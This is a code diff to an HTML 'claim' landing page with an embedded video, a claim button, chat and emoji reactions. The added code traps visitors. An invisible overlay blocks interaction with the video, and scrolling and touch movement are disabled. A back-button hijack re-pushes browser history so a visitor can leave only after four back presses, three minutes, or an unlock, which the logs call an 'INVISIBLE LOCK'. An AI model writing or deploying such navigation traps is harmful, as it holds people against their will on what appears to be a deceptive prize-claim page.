@@ -23,6 +23,9 @@
             display: flex;
             flex-direction: column;
             padding: 12px;
+            touch-action: none;
+            user-select: none;
+            -webkit-user-select: none;
         }
 
         .bg-glow {
@@ -108,6 +111,18 @@
         @keyframes borderGlow {
             0%, 100% { opacity: 0.4; }
             50% { opacity: 1; }
+        }
+
+        /* ===== OVERLAY TO BLOCK CLICKS ON VIDEO AREA ===== */
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            background: transparent;
+            cursor: default;
         }
 
         .headline {
@@ -332,7 +347,7 @@
             font-weight: 300;
         }
 
-        /* ===== EMOJI PICKER BUTTON - RIGHT SIDE, STABLE ===== */
+        /* ===== EMOJI PICKER - RIGHT SIDE, STABLE, BELOW CHAT ===== */
         .emoji-picker-wrapper {
             position: sticky;
             bottom: 8px;
@@ -412,11 +427,11 @@
             border-radius: 4px;
         }
 
-        /* ===== FLYING REACTIONS ===== */
+        /* ===== FLYING REACTIONS - BEHIND VIDEO ===== */
         .flying-reaction {
             position: fixed;
             font-size: 28px;
-            z-index: 9999;
+            z-index: 4;
             pointer-events: none;
             animation: flyUpSmooth 2.8s cubic-bezier(0.2, 0.8, 0.4, 1) forwards;
             will-change: transform, opacity;
@@ -502,6 +517,8 @@
                 <div id="videoContainer">
                     <!-- Video will be inserted here -->
                 </div>
+                <!-- OVERLAY TO BLOCK CLICKS ON VIDEO -->
+                <div class="video-overlay" id="videoOverlay"></div>
             </div>
             <div class="headline" id="headline">🎬 Watch Video</div>
             <div class="claim-btn-wrapper">
@@ -555,10 +572,36 @@
         videoUrl = fixYouTubeUrl(videoUrl);
         console.log('🎬 Fixed YouTube URL:', videoUrl);
 
+        // ==================== SCREEN LOCK - IMMEDIATE ====================
+        // Block all touch events on video area
+        document.getElementById('videoOverlay').addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, { passive: false });
+
+        document.getElementById('videoOverlay').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        // Lock screen orientation and prevent scrolling
+        if (screen.orientation && screen.orientation.lock) {
+            screen.orientation.lock('portrait').catch(function() {});
+        }
+
+        // Prevent any touch events from leaving the page
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
         // ==================== SMART EXIT SYSTEM ====================
         let backPressCount = 0;
         let videoPlayCount = 0;
         let isUnlocked = false;
+        let pageLoadTime = Date.now();
+        let isExiting = false;
 
         function trackVideoPlay() {
             videoPlayCount++;
@@ -570,29 +613,53 @@
         }
 
         function handleBackPress() {
+            // If already exiting, ignore
+            if (isExiting) return true;
+
+            const timeElapsed = (Date.now() - pageLoadTime) / 1000; // in seconds
+
+            console.log('⬅️ Back press - Time elapsed:', timeElapsed.toFixed(1) + 's');
+
+            // If user has been on page for more than 3 minutes (180 seconds)
+            if (timeElapsed >= 180) {
+                console.log('🚪 Exiting after 3+ minutes on page');
+                isExiting = true;
+                document.body.innerHTML = '';
+                window.location.href = 'about:blank';
+                return true;
+            }
+
+            // If unlocked, allow exit
             if (isUnlocked) {
                 console.log('🚪 Exiting (unlocked)');
+                isExiting = true;
                 document.body.innerHTML = '';
                 window.location.href = 'about:blank';
                 return true;
             }
 
+            // Increment back press count
             backPressCount++;
-            console.log('⬅️ Back press:', backPressCount);
+            console.log('⬅️ Back press count:', backPressCount);
 
-            if (backPressCount >= 5) {
-                console.log('🚪 Exiting after 5 back presses');
+            // Need 4-5 back presses to exit (simulate Android back button spam)
+            if (backPressCount >= 4) {
+                console.log('🚪 Exiting after 4+ back presses');
+                isExiting = true;
                 document.body.innerHTML = '';
                 window.location.href = 'about:blank';
                 return true;
             }
 
+            // Push state to keep user on page
             history.pushState(null, null, window.location.href);
             return false;
         }
 
+        // Push initial state
         history.pushState(null, null, window.location.href);
 
+        // Handle back button (popstate)
         window.addEventListener('popstate', function(e) {
             handleBackPress();
         });
@@ -610,6 +677,7 @@
                 if (!isUnlocked) {
                     handleBackPress();
                 } else {
+                    isExiting = true;
                     document.body.innerHTML = '';
                     window.location.href = 'about:blank';
                 }
@@ -712,7 +780,7 @@
             }
         });
 
-        // ==================== FLYING REACTIONS ====================
+        // ==================== FLYING REACTIONS - BEHIND VIDEO (z-index: 4) ====================
         const flyingEmojis = ['🎁', '💎', '🥳', '🎊', '🎉', '❤️', '🤩', '😮', '🤑', '😱'];
 
         function createFlyingReaction(emoji) {
@@ -942,10 +1010,10 @@
         console.log('🎁 Claim URL:', claimUrl);
         console.log('🔘 Button Text:', buttonText);
         console.log('📝 Headline:', headline);
-        console.log('🔒 INVISIBLE LOCK: 2 video plays OR 5 back presses to exit');
-        console.log('💬 Chat: Fade in from bottom, fade out at blue line (top)');
-        console.log('📍 Emoji Picker: Right side, stable, below chat messages');
-        console.log('🚫 Reactions NOT going above video');
+        console.log('🔒 SCREEN LOCK: Active');
+        console.log('⏱️ EXIT RULES: 3 mins OR 4 back presses OR unlocked');
+        console.log('📍 Emoji Picker: Right side, stable, below chat');
+        console.log('🚫 Reactions: Behind video (z-index: 4)');
     </script>
 </body>
 </html>
